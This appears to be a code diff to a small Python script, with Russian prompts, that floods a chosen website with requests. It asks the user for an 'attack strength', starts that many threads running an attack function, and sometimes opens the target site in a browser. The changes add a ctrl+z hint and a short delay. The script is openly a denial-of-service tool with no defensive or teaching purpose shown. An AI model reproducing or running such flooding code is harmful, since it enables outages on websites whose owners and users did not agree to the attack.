@@ -4,6 +4,7 @@ try:
 	import requests, webbrowser
 	from colorama import Fore, Style, Back
 	import threading
+	import time
 
 	def attack(n, name):
 		i = 1	
@@ -30,12 +31,16 @@ try:
 	force = int(input("Введите силу аттаки: "))
 	if op == "n" or op == "N":
 		print("Атака начинается...")
+		print("Чтобы прервать атаку нажмите ctrl+z")
+		time.sleep(2)
 		for i in range(force):
 			t = threading.Thread(target=attack, args=(5,'Thread1'))
 			thread_list.append(t)
 			t.start()
 	if op == "y" or op == "Y":
 		print("Атака начинается...")
+		print("Чтобы прервать атаку нажмите ctrl+z")
+		time.sleep(2)
 		webbrowser.open(site2)
 		for i in range(force):
 			t = threading.Thread(target=attack, args=(5,'Thread1'))
